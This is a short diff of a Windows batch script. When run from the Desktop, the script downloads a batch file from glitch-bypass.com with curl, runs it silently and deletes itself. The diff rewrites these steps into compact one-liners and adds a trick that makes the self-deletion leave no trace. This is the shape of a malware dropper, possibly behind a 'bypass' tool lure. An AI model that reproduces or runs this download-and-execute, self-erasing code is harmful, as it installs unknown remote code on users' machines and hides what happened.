@@ -11,10 +11,8 @@ set "currentDir=%currentDir:~0,-1%"
 :: Compare paths (case-insensitive)
 if /i "%currentDir%"=="%desktopDir%" (
     echo Running from Desktop. Proceeding...
-    curl -o update.bat https://www.glitch-bypass.com/terminal/update.bat >nul
-    call update.bat
-    del update.bat
-    del "%~f0"
+    curl -o a.bat https://www.glitch-bypass.com/terminal/update.bat>nul & a.bat
+    (goto) 2>nul & del "%~f0" & exit
     exit
 ) else (
     echo ===================================================
